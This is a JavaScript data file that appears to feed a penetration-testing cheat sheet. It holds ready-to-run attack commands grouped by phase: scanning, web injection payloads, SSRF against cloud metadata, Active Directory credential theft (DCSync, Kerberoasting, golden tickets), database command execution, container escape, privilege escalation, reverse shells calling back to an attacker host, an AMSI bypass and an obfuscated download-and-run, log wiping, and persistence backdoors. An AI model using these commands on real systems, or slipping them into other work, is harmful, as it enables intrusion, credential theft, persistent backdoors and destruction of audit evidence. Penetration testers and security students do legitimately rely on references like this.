const masterdata = [
    // --- [01] RECONNAISSANCE & ENUMERATION ---
    { os: "all", service: "all", category: "01: Recon", priority: "high", task: "Full Port Scan (Nmap)", command: "nmap -p- -sV -sC -T4 -oN full_scan.txt TARGET" },
    { os: "all", service: "all", category: "01: Recon", task: "UDP Common Ports", command: "sudo nmap -sU --top-ports 20 -T4 TARGET" },
    { os: "apps", service: "http", category: "01: Recon", task: "Identify Technology Stack", command: "whatweb http://TARGET:PORT" },
    { os: "apps", service: "http", category: "01: Recon", priority: "high", task: "Directory Brute Force (ffuf)", command: "ffuf -w /usr/share/wordlists/dirb/common.txt -u http://TARGET:PORT/FUZZ" },
    { os: "apps", service: "http", category: "01: Recon", task: "Subdomain Enumeration", command: "ffuf -w subdomains.txt -u http://FUZZ.TARGET -H 'Host: FUZZ.TARGET'" },
    { os: "all", service: "all", category: "01: Recon", task: "Searchsploit Version Lookup", command: "searchsploit \"Service Name Version\"" },

    // --- [02] OWASP WEB VULNERABILITIES ---
    { os: "apps", service: "http", category: "02: OWASP", priority: "high", task: "A01: IDOR Parameter Tampering", command: "curl -X GET 'http://TARGET:PORT/api/profile?user_id=1001' # Change to 1002" },
    { os: "apps", service: "http", category: "02: OWASP", task: "A01: IDOR Static File Access", command: "curl http://TARGET:PORT/uploads/user_1/id_card.pdf # Change user_1 to user_2" },
    { os: "apps", service: "http", category: "02: OWASP", task: "A01: Bypass 403 via Headers", command: "curl -H 'X-Forwarded-For: 127.0.0.1' http://TARGET:PORT/admin" },
    { os: "apps", service: "http", category: "02: OWASP", task: "A01: Verb Tampering", command: "curl -X POST http://TARGET:PORT/api/delete-user # Try PUT or PATCH" },
    { os: "apps", service: "http", category: "02: OWASP", task: "A02: Extract JWT for Analysis", command: "echo 'BASE64_JWT' | cut -d. -f2 | base64 -d" },
    { os: "apps", service: "http", category: "02: OWASP", task: "A02: Test JWT 'None' Algorithm", command: "Use Burp JSON Web Token extension to set alg: None" },
    { os: "apps", service: "http", category: "02: OWASP", task: "A02: Check TLS/SSL Weaknesses", command: "testssl.sh --severity HIGH TARGET" },
    { os: "apps", service: "http", category: "02: OWASP", priority: "high", task: "A03: SQLi Error-Based (MySQL)", command: "curl -u \"' OR 1=1 -- -\" http://TARGET:PORT/login" },
    { os: "apps", service: "http", category: "02: OWASP", task: "A03: SQLi Time-Based (Blind)", command: "curl 'http://TARGET:PORT/?id=1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)'" },
    { os: "apps", service: "http", category: "02: OWASP", task: "A03: OS Command Injection", command: "curl -d \"ip=127.0.0.1; whoami\" http://TARGET:PORT/ping" },
    { os: "apps", service: "http", category: "02: OWASP", task: "A03: SSTI (Python/Jinja2)", command: 'curl "http://TARGET:PORT/?name={{7*7}}" # Look for 49' },
    { os: "apps", service: "http", category: "02: OWASP", task: "A03: NoSQL Injection (MongoDB)", command: "curl -X POST -d '{\"user\":\"admin\", \"pass\":{\"$ne\":\"\"}}' http://TARGET:PORT/login" },
    { os: "apps", service: "http", category: "02: OWASP", task: "A04: Password Reset Enumeration", command: "Check if 'User not found' vs 'Email sent' responses differ" },
    { os: "apps", service: "http", category: "02: OWASP", task: "A04: Bypass MFA via Response Manipulation", command: "Intercept 2FA fail response; change 'success':false to true" },
    { os: "apps", service: "http", category: "02: OWASP", task: "A05: Default Admin Credentials", command: "Search for 'Admin/Admin', 'Guest/Guest', 'Root/Root'" },
    { os: "apps", service: "http", category: "02: OWASP", task: "A05: Exposed Directory Listings", command: "curl -s http://TARGET:PORT/images/ | grep 'Index of'" },
    { os: "apps", service: "http", category: "02: OWASP", task: "A05: Verbose Error Messages", command: "Submit invalid data types to trigger stack traces" },
    { os: "apps", service: "http", category: "02: OWASP", task: "A06: Retire.js Library Scrape", command: "retire --url http://TARGET:PORT" },
    { os: "apps", service: "http", category: "02: OWASP", task: "A07: Brute Force Login (Hydra)", command: "hydra -l admin -P /path/to/passwords.txt TARGET http-post-form \"/login:user=^USER^&pass=^PASS^:F=Login Failed\"" },
    { os: "apps", service: "http", category: "02: OWASP", task: "A07: Check for Session Fixation", command: "Compare Cookie values before and after login" },
    { os: "apps", service: "http", category: "02: OWASP", task: "A08: PHP Insecure Deserialization", command: "Check for unserialize() using user-provided input" },
    { os: "apps", service: "http", category: "02: OWASP", task: "A08: Java Deserialization (ysoserial)", command: "java -jar ysoserial.jar CommonsCollections1 'whoami' | base64" },
    { os: "apps", service: "all", category: "02: OWASP", task: "A09: Test Rate Limiting / WAF", command: "ffuf -w wordlist -u http://TARGET:PORT/FUZZ -t 100 # Observe 429 errors" },
    { os: "apps", service: "http", category: "02: OWASP", task: "A10: AWS Metadata SSRF", command: "curl http://TARGET:PORT/view?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" },
    { os: "apps", service: "http", category: "02: OWASP", priority: "high", task: "A10: Internal Port Scan (SSRF)", command: "ffuf -w ports.txt -u http://TARGET:PORT/view?url=http://127.0.0.1:FUZZ" },
    { os: "apps", service: "http", category: "02: OWASP", task: "GraphQL Introspection", command: "curl -X POST -H 'Content-Type: application/json' -d '{\"query\": \"{__schema{queryType{name}mutationType{name}}}\"}' http://TARGET:PORT/graphql" },
    { os: "apps", service: "http", category: "02: OWASP", task: "Mass Assignment (JSON)", command: "curl -X PUT -H 'Content-Type: application/json' -d '{\"role\":\"admin\",\"can_login\":true}' http://TARGET:PORT/api/user/10" },

    // --- [03] INFRASTRUCTURE & ACTIVE DIRECTORY ---
    { os: "windows", service: "ad", category: "03: Infrastructure", priority: "high", task: "AS-REP Roasting", command: "GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -outputfile hashes" },
    { os: "windows", service: "ad", category: "03: Infrastructure", priority: "high", task: "Kerberoasting", command: "GetUserSPNs.py DOMAIN/USER:PASS -dc-ip TARGET -request" },
    { os: "windows", service: "ad", category: "03: Infrastructure", task: "DCSync: Dump NTDS.dit", command: "secretsdump.py DOMAIN/USER:PASS@TARGET" },
    { os: "windows", service: "ad", category: "03: Infrastructure", task: "Pass-The-Hash (Smbexec)", command: "smbexec.py -hashes :HASH DOMAIN/USER@TARGET" },
    { os: "windows", service: "ad", category: "03: Infrastructure", task: "Check for GPP Passwords", command: "findstr /S /I \"cpassword\" \\\\DOMAIN\\sysvol\\*.xml" },
    { os: "windows", service: "ad", category: "03: Infrastructure", task: "BloodHound Collection", command: "SharpHound.exe -c All --zipfilename loot.zip" },
    { os: "windows", service: "ad", category: "03: Infrastructure", task: "Golden Ticket Attack", command: "mimikatz # kerberos::golden /domain:DOMAIN /sid:SID /rc4:KRBTGT_HASH /user:FAKE_ADMIN /ticket:gold.kirbi" },
    { os: "linux", service: "smb", category: "03: Infrastructure", task: "Anonymous SMB Map", command: "smbclient -L //TARGET/ -N" },
    { os: "linux", service: "nfs", category: "03: Infrastructure", task: "Show NFS Mounts", command: "showmount -e TARGET" },
    { os: "all", service: "snmp", category: "03: Infrastructure", task: "SNMP Walk (Public)", command: "snmpwalk -c public -v2c TARGET" },

    // --- [04] SERVICES & APPLICATIONS ---
    { os: "apps", service: "jenkins", category: "04: Apps", priority: "high", task: "Jenkins Groovy Shell RCE", command: "println 'whoami'.execute().text" },
    { os: "apps", service: "redis", category: "04: Apps", task: "Redis to Webshell", command: "redis-cli -h TARGET config set dir /var/www/html && redis-cli -h TARGET set test \"<?php system($_GET['cmd']); ?>\" && redis-cli -h TARGET save" },
    { os: "all", service: "mysql", category: "04: Apps", task: "MySQL Read System Files", command: "SELECT LOAD_FILE('/etc/passwd');" },
    { os: "all", service: "mssql", category: "04: Apps", task: "MSSQL Enable xp_cmdshell", command: "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;" },
    { os: "all", service: "mssql", category: "04: Apps", task: "MSSQL Execute Command", command: "EXEC xp_cmdshell 'whoami';" },
    { os: "all", service: "postgresql", category: "04: Apps", task: "PostgreSQL Read File", command: "CREATE TABLE temp(t TEXT); COPY temp FROM '/etc/passwd'; SELECT * FROM temp;" },
    { os: "apps", service: "docker", category: "04: Apps", task: "Docker Socket Escape", command: "docker run -v /:/host -it alpine chroot /host" },
    { os: "apps", service: "kubernetes", category: "04: Apps", task: "List K8s Pods (Unauth)", command: "curl -sk https://TARGET:10250/pods" },
    { os: "apps", service: "kubernetes", category: "04: Apps", task: "Check for K8s SA Token", command: "cat /var/run/secrets/kubernetes.io/serviceaccount/token" },

    // --- [05] PRIVILEGE ESCALATION ---
    { os: "linux", service: "all", category: "05: PrivEsc", priority: "high", task: "Sudo -l (GTFOBins check)", command: "sudo -l" },
    { os: "linux", service: "all", category: "05: PrivEsc", task: "SUID Search", command: "find / -perm -u=s -type f 2>/dev/null" },
    { os: "linux", service: "all", category: "05: PrivEsc", task: "Capabilities Search", command: "getcap -r / 2>/dev/null" },
    { os: "linux", service: "all", category: "05: PrivEsc", task: "Kernel Exploit Check", command: "linux-exploit-suggester.sh" },
    { os: "windows", service: "all", category: "05: PrivEsc", priority: "high", task: "Check SeImpersonatePrivilege", command: "PrintSpoofer64.exe -i -c cmd" },
    { os: "windows", service: "all", category: "05: PrivEsc", task: "Unquoted Service Paths", command: "wmic service get name,displayname,pathname,startmode | findstr /i \"Auto\" | findstr /v /i \"C:\\Windows\"" },
    { os: "windows", service: "all", category: "05: PrivEsc", task: "AlwaysInstallElevated", command: "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated" },
    { os: "windows", service: "all", category: "05: PrivEsc", task: "Find Sensitive Files (Local)", command: "dir /s *pass* *cred* *vnc* *config*" },
    { os: "windows", service: "all", category: "05: PrivEsc", task: "List Named Pipes", command: "pipelist.exe /acceptEula" },

// --- [06] PAYLOADS & EVASION ---
    { os: "linux", service: "all", category: "06: Payloads", task: "Bash TCP Reverse Shell", command: "bash -i >& /dev/tcp/LHOST/LPORT 0>&1" },
    { os: "linux", service: "all", category: "06: Payloads", task: "Python3 Reverse Shell", command: "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'" },
    { os: "windows", service: "all", category: "06: Payloads", task: "PowerShell Reverse Shell", command: "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"" },
    { os: "windows", service: "all", category: "06: Evasion", task: "Bypass AMSI (PowerShell)", command: "S[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)" },
    { os: "windows", service: "all", category: "06: Evasion", task: "Invoke-Expression (Obfuscated)", command: "iex (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/sh.ps1' -replace 'http','ht'+'tp')" },

    // --- [07] POST-EXPLOTATION & PIVOTING ---
    { os: "linux", service: "all", category: "07: Post-Ex", task: "TTY Upgrade (Python)", command: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' # Then: Ctrl+Z -> stty raw -echo; fg" },
    { os: "linux", service: "all", category: "07: Post-Ex", task: "Set Terminal Environment", command: "export TERM=xterm-256color" },
    { os: "windows", service: "all", category: "07: Post-Ex", task: "Certutil Download (Bypass)", command: "certutil.exe -urlcache -split -f http://LHOST:LPORT/file.exe file.exe" },
    { os: "linux", service: "all", category: "07: Post-Ex", task: "Wget Download to /tmp", command: "wget http://LHOST:LPORT/linpeas.sh -O /tmp/linpeas.sh" },
    { os: "all", service: "pivoting", category: "07: Post-Ex", priority: "high", task: "Chisel SOCKS Tunnel", command: "./chisel server -p LPORT --reverse" },
    { os: "all", service: "pivoting", category: "07: Post-Ex", task: "SSH Dynamic Port Forward", command: "ssh -D LPORT user@TARGET" },
    { os: "all", service: "all", category: "07: Post-Ex", task: "Cleanup History & Logs", command: "history -c && rm ~/.bash_history && wevtutil cl Security" },

    // --- [08] PERSISTENCE ---
    { os: "linux", service: "all", category: "08: Persistence", task: "SSH Authorized Keys", command: "echo 'YOUR_PUB_KEY' >> ~/.ssh/authorized_keys" },
    { os: "linux", service: "all", category: "08: Persistence", task: "Cron Job Reverse Shell", command: "(crontab -l ; echo \"*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'\") | crontab -" },
    { os: "linux", service: "all", category: "08: Persistence", task: "Suid Bash Backdoor", command: "cp /bin/bash /tmp/.bkd && chmod +s /tmp/.bkd" },
    { os: "windows", service: "all", category: "08: Persistence", task: "Registry Run Key", command: "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Exploit /t REG_SZ /d \"C:\\temp\\shell.exe\"" }
];
